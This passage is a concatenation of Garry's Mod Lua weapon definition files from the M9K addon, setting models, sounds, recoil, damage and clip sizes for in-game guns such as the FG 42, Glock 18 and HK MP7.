		SWEP.Primary.DefaultClip = SWEP.Primary.ClipSize * GetConVar("M9KDefaultClip"):GetInt()
	end
end

if GetConVar("M9KUniqueSlots") != nil then
	if not (GetConVar("M9KUniqueSlots"):GetBool()) then 
		SWEP.SlotPos = 2
	end
end
--PATH addons/__main/lua/weapons/m9k_fg42/shared.lua:
-- Variables that are used on both client and server
SWEP.Gun = ("m9k_fg42") -- must be the name of your swep but NO CAPITALS!
if (GetConVar(SWEP.Gun.."_allowed")) != nil then
	if not (GetConVar(SWEP.Gun.."_allowed"):GetBool()) then SWEP.Base = "bobs_blacklisted" SWEP.PrintName = SWEP.Gun return end
end
SWEP.Category				= "M9K Machine Guns"
SWEP.Author				= ""
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "FG 42"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 3				-- Slot in the weapon selection menu
SWEP.SlotPos				= 33			-- Position in the slot
SWEP.DrawAmmo				= true		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= true		-- set false if you want no crosshair
SWEP.Weight				= 30			-- rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= true		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.HoldType 				= "ar2"		-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.ViewModelFOV			= 70
SWEP.ViewModelFlip			= true
SWEP.ViewModel				= "models/weapons/v_rif_fg42.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_fg42.mdl"	-- Weapon world model
SWEP.Base				= "bobs_gun_base"
SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true
SWEP.FiresUnderwater = false

SWEP.Primary.Sound			= Sound("FG42_weapon.Single")		-- Script that calls the primary fire sound
SWEP.Primary.RPM			= 900			-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 20		-- Size of a clip
SWEP.Primary.DefaultClip		= 60		-- Bullets you start with
SWEP.Primary.KickUp				= 0.3		-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= 0.3		-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal		= 0.3		-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= true		-- Automatic = true; Semi Auto = false
SWEP.Primary.Ammo			= "ar2"				
-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a metal peircing shotgun slug

SWEP.Secondary.IronFOV			= 55		-- How much you 'zoom' in. Less is more! 	

SWEP.data 				= {}				--The starting firemode
SWEP.data.ironsights			= 1

SWEP.Primary.NumShots	= 1		-- How many bullets to shoot per trigger pull
SWEP.Primary.Damage		= 38	-- Base damage per bullet
SWEP.Primary.Spread		= .02	-- Define from-the-hip accuracy (1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = .01 -- Ironsight accuracy, should be the same for shotguns

-- Enter iron sight info and bone mod info below
SWEP.IronSightsPos = Vector(3.47, -6.078, 1.93)
SWEP.IronSightsAng = Vector(0.216, -0.082, 0)
SWEP.SightsPos = Vector(3.47, -6.078, 1.93)
SWEP.SightsAng = Vector(0.216, -0.082, 0)
SWEP.RunSightsPos = Vector(-5.738, -1.803, 0)
SWEP.RunSightsAng = Vector(-7.46, -47.624, 0)

if GetConVar("M9KDefaultClip") == nil then
	print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
	if GetConVar("M9KDefaultClip"):GetInt() != -1 then
		SWEP.Primary.DefaultClip = SWEP.Primary.ClipSize * GetConVar("M9KDefaultClip"):GetInt()
	end
end

if GetConVar("M9KUniqueSlots") != nil then
	if not (GetConVar("M9KUniqueSlots"):GetBool()) then 
		SWEP.SlotPos = 2
	end
end
--PATH addons/__main/lua/weapons/m9k_glock/shared.lua:
-- Variables that are used on both client and server
SWEP.Gun = ("m9k_glock") -- must be the name of your swep but NO CAPITALS!
if (GetConVar(SWEP.Gun.."_allowed")) != nil then
	if not (GetConVar(SWEP.Gun.."_allowed"):GetBool()) then SWEP.Base = "bobs_blacklisted" SWEP.PrintName = SWEP.Gun return end
end
SWEP.Category				= "M9K Pistols"
SWEP.Author				= "iron angles and models hexed and converted to gmod my Mr Fokkusu"
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "Glock 18"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 1				-- Slot in the weapon selection menu
SWEP.SlotPos				= 22			-- Position in the slot
SWEP.DrawAmmo				= true		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= true		-- set false if you want no crosshair
SWEP.Weight				= 3			-- rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= true		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.HoldType 				= "pistol"		-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.ViewModelFOV			= 70
SWEP.ViewModelFlip			= true
SWEP.ViewModel				= "models/weapons/v_dmg_glock.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_dmg_glock.mdl"	-- Weapon world model
SWEP.Base				= "bobs_gun_base"
SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true
SWEP.FiresUnderwater = false

SWEP.Primary.Sound			= Sound("Dmgfok_glock.Single")		-- Script that calls the primary fire sound
SWEP.Primary.RPM			= 1200			-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 32		-- Size of a clip
SWEP.Primary.DefaultClip		= 64		-- Bullets you start with
SWEP.Primary.KickUp				= 0.4		-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= 0.3		-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal		= 0.3		-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= true		-- Automatic = true; Semi Auto = false
SWEP.Primary.Ammo			= "pistol"			-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a light metal peircing shotgun pellets

SWEP.SelectiveFire		= true

SWEP.Secondary.IronFOV			= 60		-- How much you 'zoom' in. Less is more! 	

SWEP.data 				= {}				--The starting firemode
SWEP.data.ironsights			= 1

SWEP.Primary.NumShots	= 1		-- How many bullets to shoot per trigger pull
SWEP.Primary.Damage		= 12	-- Base damage per bullet
SWEP.Primary.Spread		= .03	-- Define from-the-hip accuracy 1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = .02 -- Ironsight accuracy, should be the same for shotguns

-- Enter iron sight info and bone mod info below
SWEP.IronSightsPos = Vector (2.2042, 0, 1.7661)
SWEP.IronSightsAng = Vector (0, 0, 0)
SWEP.SightsPos = Vector (2.2042, 0, 1.7661)
SWEP.SightsAng = Vector (0, 0, 0)
SWEP.RunSightsPos = Vector (0.4751, 0, 1.8442)
SWEP.RunSightsAng = Vector (-17.6945, -1.4012, 0)

if GetConVar("M9KDefaultClip") == nil then
	print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
	if GetConVar("M9KDefaultClip"):GetInt() != -1 then
		SWEP.Primary.DefaultClip = SWEP.Primary.ClipSize * GetConVar("M9KDefaultClip"):GetInt()
	end
end

if GetConVar("M9KUniqueSlots") != nil then
	if not (GetConVar("M9KUniqueSlots"):GetBool()) then 
		SWEP.SlotPos = 2
	end
end
--PATH addons/__main/lua/weapons/m9k_luger/shared.lua:
-- Variables that are used on both client and server
SWEP.Gun = ("m9k_luger") -- must be the name of your swep but NO CAPITALS!
if (GetConVar(SWEP.Gun.."_allowed")) != nil then
	if not (GetConVar(SWEP.Gun.."_allowed"):GetBool()) then SWEP.Base = "bobs_blacklisted" SWEP.PrintName = SWEP.Gun return end
end
SWEP.Category				= "M9K Pistols"
SWEP.Author				= ""
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "P08 Luger"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 1				-- Slot in the weapon selection menu
SWEP.SlotPos				= 24		-- Position in the slot
SWEP.DrawAmmo				= true		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= true		-- set false if you want no crosshair
SWEP.Weight				= 3				-- rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= true		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.HoldType 				= "pistol"		-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.ViewModelFOV			= 70
SWEP.ViewModelFlip			= true
SWEP.ViewModel				= "models/weapons/v_p08_luger.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_luger_p08.mdl"	-- Weapon world model
SWEP.Base				= "bobs_gun_base"
SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true
SWEP.FiresUnderwater = false

SWEP.Primary.Sound			= Sound("weapon_luger.single")		-- Script that calls the primary fire sound
SWEP.Primary.RPM			= 825			-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 8		-- Size of a clip
SWEP.Primary.DefaultClip		= 45		-- Bullets you start with
SWEP.Primary.KickUp				= 0.35		-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= 0.3		-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal		= 0.2		-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= false		-- Automatic = true; Semi Auto = false
SWEP.Primary.Ammo			= "pistol"				
-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a metal peircing shotgun slug

SWEP.Secondary.IronFOV			= 55		-- How much you 'zoom' in. Less is more! 	

SWEP.data 				= {}				--The starting firemode
SWEP.data.ironsights			= 1

SWEP.Primary.NumShots	= 1		-- How many bullets to shoot per trigger pull
SWEP.Primary.Damage		= 23	-- Base damage per bullet
SWEP.Primary.Spread		= .021	-- Define from-the-hip accuracy (1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = .011 -- Ironsight accuracy, should be the same for shotguns

-- Enter iron sight info and bone mod info below
SWEP.IronSightsPos = Vector(2.71, -2.122, 2.27)
SWEP.IronSightsAng = Vector(0.563, -0.013, 0)
SWEP.SightsPos = Vector(2.71, -2.122, 2.27)
SWEP.SightsAng = Vector(0.563, -0.013, 0)
SWEP.RunSightsPos = Vector(0, 0, 2.575)
SWEP.RunSightsAng = Vector(-14.657, 0, 0)

if GetConVar("M9KDefaultClip") == nil then
	print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
	if GetConVar("M9KDefaultClip"):GetInt() != -1 then
		SWEP.Primary.DefaultClip = SWEP.Primary.ClipSize * GetConVar("M9KDefaultClip"):GetInt()
	end
end

if GetConVar("M9KUniqueSlots") != nil then
	if not (GetConVar("M9KUniqueSlots"):GetBool()) then 
		SWEP.SlotPos = 2
	end
end
--PATH addons/__main/lua/weapons/m9k_magpulpdr/shared.lua:
-- Variables that are used on both client and server
SWEP.Gun = ("m9k_magpulpdr") -- must be the name of your swep but NO CAPITALS!
if (GetConVar(SWEP.Gun.."_allowed")) != nil then
	if not (GetConVar(SWEP.Gun.."_allowed"):GetBool()) then SWEP.Base = "bobs_blacklisted" SWEP.PrintName = SWEP.Gun return end
end
SWEP.Category				= "M9K Submachine Guns"
SWEP.Author				= ""
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "Magpul PDR"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 2				-- Slot in the weapon selection menu
SWEP.SlotPos				= 45			-- Position in the slot
SWEP.DrawAmmo				= true		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= true		-- set false if you want no crosshair
SWEP.Weight				= 30			-- rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= true		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.HoldType 				= "smg"		-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.ViewModelFOV			= 70
SWEP.ViewModelFlip			= true
SWEP.ViewModel				= "models/weapons/v_pdr_smg.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_magpul_pdr.mdl"	-- Weapon world model 
SWEP.Base				= "bobs_gun_base"
SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true
SWEP.FiresUnderwater = false

SWEP.Primary.Sound			= Sound("MAG_PDR.Single")		-- Script that calls the primary fire sound
SWEP.Primary.RPM			= 575			-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 30		-- Size of a clip
SWEP.Primary.DefaultClip		= 60		-- Bullets you start with
SWEP.Primary.KickUp				= 0.3		-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= 0.3		-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal		= 0.3		-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= true		-- Automatic = true; Semi Auto = false
SWEP.Primary.Ammo			= "smg1"			-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a light metal peircing shotgun pellets

SWEP.SelectiveFire		= true

SWEP.Secondary.IronFOV			= 55		-- How much you 'zoom' in. Less is more! 	

SWEP.data 				= {}				--The starting firemode
SWEP.data.ironsights			= 1

SWEP.Primary.NumShots	= 1		-- How many bullets to shoot per trigger pull
SWEP.Primary.Damage		= 30	-- Base damage per bullet
SWEP.Primary.Spread		= .03	-- Define from-the-hip accuracy 1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = .02 -- Ironsight accuracy, should be the same for shotguns

-- Enter iron sight info and bone mod info below
SWEP.IronSightsPos = Vector(4.8, 0, 2.079)
SWEP.IronSightsAng = Vector(0, 0, 0)
SWEP.SightsPos = Vector(4.8, 0, 2.079)
SWEP.SightsAng = Vector(0, 0, 0)
SWEP.RunSightsPos = Vector(-2.437, -1.364, 1.45)
SWEP.RunSightsAng = Vector(-15.263, -41.1, 0)


if GetConVar("M9KDefaultClip") == nil then
	print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
	if GetConVar("M9KDefaultClip"):GetInt() != -1 then
		SWEP.Primary.DefaultClip = SWEP.Primary.ClipSize * GetConVar("M9KDefaultClip"):GetInt()
	end
end

if GetConVar("M9KUniqueSlots") != nil then
	if not (GetConVar("M9KUniqueSlots"):GetBool()) then 
		SWEP.SlotPos = 2
	end
end
--PATH addons/__main/lua/weapons/m9k_model3russian/shared.lua:
-- Variables that are used on both client and server
SWEP.Gun = ("m9k_model3russian") -- must be the name of your swep but NO CAPITALS!
if (GetConVar(SWEP.Gun.."_allowed")) != nil then
	if not (GetConVar(SWEP.Gun.."_allowed"):GetBool()) then SWEP.Base = "bobs_blacklisted" SWEP.PrintName = SWEP.Gun return end
end
SWEP.Category				= "M9K Pistols"
SWEP.Author				= ""
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "S & W Model 3 Russian"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 1				-- Slot in the weapon selection menu
SWEP.SlotPos				= 27			-- Position in the slot
SWEP.DrawAmmo				= true		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= true		-- set false if you want no crosshair
SWEP.Weight				= 3			-- rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= true		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.HoldType 				= "revolver"		-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.ViewModelFOV			= 60
SWEP.ViewModelFlip			= true
SWEP.ViewModel				= "models/weapons/v_pist_model3.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_model_3_rus.mdl"	-- Weapon world model
SWEP.Base				= "bobs_gun_base"
SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true
SWEP.FiresUnderwater = false

SWEP.Primary.Sound			= Sound("Model3.Single")		-- Script that calls the primary fire sound
SWEP.Primary.RPM			= 115			-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 6		-- Size of a clip
SWEP.Primary.DefaultClip		= 30		-- Bullets you start with
SWEP.Primary.KickUp				= 1		-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= 0.5		-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal		= 0.5		-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= false		-- Automatic = true; Semi Auto = false
SWEP.Primary.Ammo			= "357"			-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a light metal peircing shotgun pellets

SWEP.Secondary.IronFOV			= 65		-- How much you 'zoom' in. Less is more! 	

SWEP.data 				= {}				--The starting firemode
SWEP.data.ironsights			= 1

SWEP.Primary.NumShots	= 1		-- How many bullets to shoot per trigger pull
SWEP.Primary.Damage		= 30	-- Base damage per bullet
SWEP.Primary.Spread		= .02	-- Define from-the-hip accuracy 1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = .01 -- Ironsight accuracy, should be the same for shotguns

-- Enter iron sight info and bone mod info below
SWEP.IronSightsPos = Vector(4.06, 0, 0.876)
SWEP.IronSightsAng = Vector(-0.207, 0, 0)
SWEP.SightsPos = Vector(4.06, 0, 0.876)
SWEP.SightsAng = Vector(-0.207, 0, 0)
SWEP.RunSightsPos = Vector(-0.165, -10.329, -5.41)
SWEP.RunSightsAng = Vector(70, 0, 0)

if GetConVar("M9KDefaultClip") == nil then
	print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
	if GetConVar("M9KDefaultClip"):GetInt() != -1 then
		SWEP.Primary.DefaultClip = SWEP.Primary.ClipSize * GetConVar("M9KDefaultClip"):GetInt()
	end
end

if GetConVar("M9KUniqueSlots") != nil then
	if not (GetConVar("M9KUniqueSlots"):GetBool()) then 
		SWEP.SlotPos = 2
	end
end
--PATH addons/__main/lua/weapons/m9k_mp7/shared.lua:
-- Variables that are used on both client and server
SWEP.Gun = ("m9k_mp7") -- must be the name of your swep but NO CAPITALS!
if (GetConVar(SWEP.Gun.."_allowed")) != nil then
	if not (GetConVar(SWEP.Gun.."_allowed"):GetBool()) then SWEP.Base = "bobs_blacklisted" SWEP.PrintName = SWEP.Gun return end
end
SWEP.Category				= "M9K Submachine Guns"
SWEP.Author				= ""
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "HK MP7"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 2				-- Slot in the weapon selection menu
SWEP.SlotPos				= 48			-- Position in the slot
SWEP.DrawAmmo				= true		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= true		-- Set false if you want no crosshair from hip
SWEP.Weight				= 50			-- Rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= true		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.XHair					= true		-- Used for returning crosshair after scope. Must be the same as DrawCrosshair
SWEP.BoltAction				= false		-- Is this a bolt action rifle?
SWEP.HoldType 				= "ar2"		-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.ViewModelFOV			= 70
SWEP.ViewModelFlip			= true
SWEP.ViewModel				= "models/weapons/v_mp7_silenced.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_mp7_silenced.mdl"	-- Weapon world model
SWEP.Base 				= "bobs_scoped_base"
SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true

SWEP.Primary.Sound			= Sound("Weapon_MP7.single")		-- script that calls the primary fire sound
SWEP.Primary.RPM				= 950		-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 30		-- Size of a clip
SWEP.Primary.DefaultClip			= 60	-- Bullets you start with
SWEP.Primary.KickUp			= .5				-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= .4			-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal			= .4		-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= true		-- Automatic/Semi Auto
SWEP.Primary.Ammo			= "smg1"	-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a light metal peircing shotgun pellets
SWEP.SelectiveFire		= true

SWEP.Secondary.ScopeZoom			= 4	
SWEP.Secondary.UseACOG			= false -- Choose one scope type
SWEP.Secondary.UseMilDot		= false	-- I mean it, only one	
SWEP.Secondary.UseSVD			= false	-- If you choose more than one, your scope will not show up at all
SWEP.Secondary.UseParabolic		= false	
SWEP.Secondary.UseElcan			= false
SWEP.Secondary.UseGreenDuplex	= false
SWEP.Secondary.UseAimpoint		= true

SWEP.data 				= {}
SWEP.data.ironsights			= 1
SWEP.ScopeScale 			= 0.7

SWEP.Primary.NumShots	= 1		--how many bullets to shoot per trigger pull
SWEP.Primary.Damage		= 24	--base damage per bullet
SWEP.Primary.Spread		= .023	--define from-the-hip accuracy 1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = .014 -- ironsight accuracy, should be the same for shotguns

-- enter iron sight info and bone mod info below

SWEP.IronSightsPos = Vector (3, -5, 1.5)
SWEP.IronSightsAng = Vector (0, 0, 0)
SWEP.SightsPos = Vector (3, -5, 1.5)
SWEP.SightsAng = Vector (0, 0, 0)
SWEP.RunSightsPos = Vector (-3.1731, -5.3573, 1.4608)
SWEP.RunSightsAng = Vector (-18.7139, -48.1596, 0)

if (gmod.GetGamemode().Name == "Murderthon 9000") then

	SWEP.Slot		= 1				-- Slot in the weapon selection menu
	SWEP.Weight		= 3			-- rank relative ot other weapons. bigger is better

end

if GetConVar("M9KDefaultClip") == nil then
	print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
	if GetConVar("M9KDefaultClip"):GetInt() != -1 then
		SWEP.Primary.DefaultClip = SWEP.Primary.ClipSize * GetConVar("M9KDefaultClip"):GetInt()
	end
end

if GetConVar("M9KUniqueSlots") != nil then
	if not (GetConVar("M9KUniqueSlots"):GetBool()) then 
		SWEP.SlotPos = 2
	end
end
--PATH addons/__main/lua/weapons/m9k_remington1858/shared.lua:
-- Variables that are used on both client and server
SWEP.Gun = ("m9k_remington1858") -- must be the name of your swep but NO CAPITALS!
if (GetConVar(SWEP.Gun.."_allowed")) != nil then
	if not (GetConVar(SWEP.Gun.."_allowed"):GetBool()) then SWEP.Base = "bobs_blacklisted" SWEP.PrintName = SWEP.Gun return end
end
SWEP.Category				= "M9K Pistols"
SWEP.Author				= ""
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "Remington 1858"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 1				-- Slot in the weapon selection menu
SWEP.SlotPos				= 31			-- Position in the slot
SWEP.DrawAmmo				= true		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= true		-- set false if you want no crosshair
SWEP.Weight				= 3			-- rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= true		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.HoldType 				= "revolver"		-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.ViewModelFOV			= 65
SWEP.ViewModelFlip			= true
SWEP.ViewModel				= "models/weapons/v_pist_re1858.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_remington_1858.mdl"	-- Weapon world model
SWEP.Base				= "bobs_gun_base"
SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true
SWEP.FiresUnderwater = false

SWEP.Primary.Sound			= Sound("Remington.single")		-- Script that calls the primary fire sound
SWEP.Primary.RPM			= 150			-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 6		-- Size of a clip
SWEP.Primary.DefaultClip		= 30		-- Bullets you start with
SWEP.Primary.KickUp				= 0.9		-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= 0.5		-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal		= 0.4		-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= false		-- Automatic = true; Semi Auto = false
SWEP.Primary.Ammo			= "357"			-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a light metal peircing shotgun pellets

SWEP.Secondary.IronFOV			= 65		-- How much you 'zoom' in. Less is more! 	

SWEP.data 				= {}				--The starting firemode
SWEP.data.ironsights			= 1

SWEP.Primary.NumShots	= 1		-- How many bullets to shoot per trigger pull
SWEP.Primary.Damage		= 34	-- Base damage per bullet
SWEP.Primary.Spread		= .025	-- Define from-the-hip accuracy 1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = .012 -- Ironsight accuracy, should be the same for shotguns

-- Enter iron sight info and bone mod info below
SWEP.IronSightsPos = Vector(5.44, 0, 1.72)
SWEP.IronSightsAng = Vector(0, 0, 0)
SWEP.SightsPos = Vector(5.44, 0, 1.72)
SWEP.SightsAng = Vector(0, 0, 0)
SWEP.RunSightsPos = Vector(-0.165, -10.329, -5.41)
SWEP.RunSightsAng = Vector(70, 0, 0)

if GetConVar("M9KDefaultClip") == nil then
	print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
	if GetConVar("M9KDefaultClip"):GetInt() != -1 then
		SWEP.Primary.DefaultClip = SWEP.Primary.ClipSize * GetConVar("M9KDefaultClip"):GetInt()
	end
end

if GetConVar("M9KUniqueSlots") != nil then
	if not (GetConVar("M9KUniqueSlots"):GetBool()) then 
		SWEP.SlotPos = 2
	end
end
--PATH addons/__main/lua/weapons/m9k_sten/shared.lua:
-- Variables that are used on both client and server
SWEP.Gun = ("m9k_sten") -- must be the name of your swep but NO CAPITALS!
if (GetConVar(SWEP.Gun.."_allowed")) != nil then
	if not (GetConVar(SWEP.Gun.."_allowed"):GetBool()) then SWEP.Base = "bobs_blacklisted" SWEP.PrintName = SWEP.Gun return end
end
SWEP.Category				= "M9K Submachine Guns"
SWEP.Author				= ""
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
